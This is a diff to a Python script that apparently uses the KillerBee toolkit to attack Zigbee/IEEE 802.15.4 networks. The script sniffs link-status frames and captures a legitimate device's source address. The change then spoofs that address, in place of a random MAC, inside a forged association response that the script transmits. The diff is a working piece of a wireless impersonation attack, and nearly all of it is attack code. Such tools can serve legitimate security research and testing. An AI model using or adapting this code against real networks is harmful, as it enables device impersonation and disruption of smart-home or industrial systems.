@@ -50,6 +50,7 @@ if __name__ == '__main__':
         kb.set_channel(args.channel)
 
         link_status_sn = 0
+        link_status_source_bytes = 0
         got_link_status = False
         print('- Listening for link status.')
         kb.sniffer_on()
@@ -61,6 +62,7 @@ if __name__ == '__main__':
                 if (packet_bytes[0] & 0b111 == 0b001 and packet_bytes[25] == 0x08):
                     print(' - Got link status!')
                     link_status_sn = packet_bytes[2]
+                    link_status_source_bytes = packet_bytes[17:25]
                     got_link_status = True
         kb.sniffer_off()
 
@@ -158,7 +160,7 @@ if __name__ == '__main__':
         assoc_response_seq_num = assoc_request_pkt_bytes[2]+1
         assoc_response_dest_mac = assoc_request_pkt_bytes[9:17]
         assoc_response_dest_pan = assoc_request_pkt_bytes[3:5]
-        fake_mac_addr_bytes = bytearray(kbutils.randmac())
+        #fake_mac_addr_bytes = bytearray(kbutils.randmac())
         # 1. 2 bytes of frame info and sequence number (assoc request SN + 1)
         # 2. Destination PAN (extracted from assoc request)
         # 3. Destination MAC address (extracted from assoc request)
@@ -167,7 +169,7 @@ if __name__ == '__main__':
         assoc_response_pkt_bytes = bytearray([0x63, 0xcc, assoc_response_seq_num]) + \
                 assoc_response_dest_pan + \
                 assoc_response_dest_mac + \
-                fake_mac_addr_bytes + \
+                link_status_source_bytes + \
                 bytearray([0x02, 0x34, 0x12, 0x00])
 
         # Send forged association response
